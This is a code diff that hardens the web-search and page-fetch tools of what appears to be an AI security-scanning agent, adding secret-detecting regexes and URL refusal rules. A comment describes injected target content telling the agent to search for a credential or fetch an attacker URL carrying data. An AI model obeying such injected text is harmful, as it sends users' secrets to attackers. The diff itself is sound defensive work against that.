@@ -3,8 +3,10 @@
 from __future__ import annotations
 
 import asyncio
+import ipaddress
 import json
 import logging
+import re
 from typing import TYPE_CHECKING, Any, cast
 from urllib.parse import urlsplit, urlunsplit
 
@@ -12,6 +14,7 @@ import requests
 from agents import RunContextWrapper, function_tool
 
 from strix.config import load_settings
+from strix.core.scope import ScopePolicy, scope_policy_from_context
 
 
 if TYPE_CHECKING:
@@ -169,6 +172,9 @@ def _resolve_provider(  # noqa: PLR0911 - each provider/missing-key case needs i
     perplexity_key = integrations.perplexity_api_key
     exa_key = integrations.exa_api_key
 
+    if provider == "off":
+        return _DISABLED_ERROR
+
     if provider == "perplexity":
         if not perplexity_key:
             return _not_configured_error("PERPLEXITY_API_KEY")
@@ -183,6 +189,61 @@ def _resolve_provider(  # noqa: PLR0911 - each provider/missing-key case needs i
     if perplexity_key:
         return ("perplexity", perplexity_key)
     return _not_configured_error("EXA_API_KEY or PERPLEXITY_API_KEY")
+
+
+_DISABLED_ERROR: dict[str, Any] = {
+    "success": False,
+    "error": "Web search is disabled for this scan by the operator. Proceed without it",
+}
+
+# Queries and URLs leave the scan for a third-party provider (and, for page
+# fetches, for whatever host the URL names). Content an agent read in a target
+# can ask it to "search for" a credential or fetch https://attacker/?d=<data>,
+# so anything that looks like a secret is refused rather than sent.
+_SECRET_PATTERNS = tuple(
+    re.compile(pattern)
+    for pattern in (
+        r"AKIA[0-9A-Z]{16}",
+        r"ASIA[0-9A-Z]{16}",
+        r"-----BEGIN [A-Z ]*PRIVATE KEY-----",
+        r"gh[pousr]_[A-Za-z0-9]{36,}",
+        r"github_pat_[A-Za-z0-9_]{40,}",
+        r"xox[abposr]-[A-Za-z0-9-]{10,}",
+        r"sk-[A-Za-z0-9_-]{20,}",
+        r"AIza[0-9A-Za-z_-]{35}",
+        r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}",
+        r"(?i)(?:bearer|basic)\s+[A-Za-z0-9._~+/=-]{16,}",
+        r"(?i)(?:password|passwd|secret|token|api[_-]?key)\s*[=:]\s*\S{6,}",
+    )
+)
+_MAX_URL_QUERY_CHARS = 256
+
+
+def _looks_secret(text: str) -> bool:
+    return any(pattern.search(text) for pattern in _SECRET_PATTERNS)
+
+
+def _refused_url_reason(url: str, policy: ScopePolicy) -> str | None:  # noqa: PLR0911 - one return per refusal reason
+    try:
+        parts = urlsplit(url)
+    except ValueError:
+        return "not a valid URL"
+    host = (parts.hostname or "").lower()
+    if parts.scheme not in ("http", "https") or not host:
+        return "only public http(s) URLs can be fetched"
+    if parts.username or parts.password:
+        return "URLs with embedded credentials are not fetched"
+    try:
+        address = ipaddress.ip_address(host)
+    except ValueError:
+        address = None
+    if address is not None and not address.is_global:
+        return "private, loopback and link-local addresses are not fetched"
+    if policy.enforced and policy.allows_host(host):
+        return "scan targets are fetched with your own tools, not a third-party service"
+    if len(parts.query) > _MAX_URL_QUERY_CHARS or _looks_secret(url):
+        return "the URL carries data that looks like a secret or an exfiltration payload"
+    return None
 
 
 def _not_configured_error(missing: str) -> dict[str, Any]:
@@ -227,6 +288,15 @@ def _guarded_call[T](  # noqa: PLR0911 - each error class needs its own sanitize
 def _do_search(query: str) -> dict[str, Any]:
     if not query or not query.strip():
         return {"success": False, "error": "Query cannot be empty"}
+    if _looks_secret(query):
+        logger.warning("web_search refused a query that looks like it carries a secret")
+        return {
+            "success": False,
+            "error": (
+                "Query refused: it contains what looks like a credential or secret, which "
+                "must not be sent to a third-party search provider. Remove it and retry"
+            ),
+        }
 
     integrations = load_settings().integrations
     resolved = _resolve_provider(integrations)
@@ -263,10 +333,20 @@ def _do_search(query: str) -> dict[str, Any]:
     }
 
 
-def _do_get_contents(urls: list[str]) -> dict[str, Any]:
+def _do_get_contents(  # noqa: PLR0911 - each refusal/missing-key case needs its own return
+    urls: list[str], policy: ScopePolicy | None = None
+) -> dict[str, Any]:
     cleaned = [url.strip() for url in urls if url and url.strip()]
     if not cleaned:
         return {"success": False, "error": "Provide at least one URL"}
+    refused = {
+        url: reason
+        for url in cleaned
+        if (reason := _refused_url_reason(url, policy or ScopePolicy())) is not None
+    }
+    if refused:
+        logger.warning("web_get_contents refused %d URL(s)", len(refused))
+        return {"success": False, "error": "Some URLs were refused", "refused_urls": refused}
     if len(cleaned) > _EXA_MAX_CONTENT_URLS:
         return {
             "success": False,
@@ -274,6 +354,8 @@ def _do_get_contents(urls: list[str]) -> dict[str, Any]:
         }
 
     integrations = load_settings().integrations
+    if integrations.web_search_provider == "off":
+        return _DISABLED_ERROR
     api_key = integrations.exa_api_key
     if not api_key:
         return _not_configured_error("EXA_API_KEY")
@@ -408,6 +490,8 @@ async def web_get_contents(ctx: RunContextWrapper, urls: list[str]) -> str:
     Args:
         urls: The page URLs to fetch, at most 10 per call. Use complete,
             public URLs (for example the ones returned by ``web_search``).
+            Scan targets, private addresses and URLs carrying secrets or
+            long query strings are refused.
     """
-    result = await asyncio.to_thread(_do_get_contents, urls)
+    result = await asyncio.to_thread(_do_get_contents, urls, scope_policy_from_context(ctx.context))
     return json.dumps(result, ensure_ascii=False, default=str)
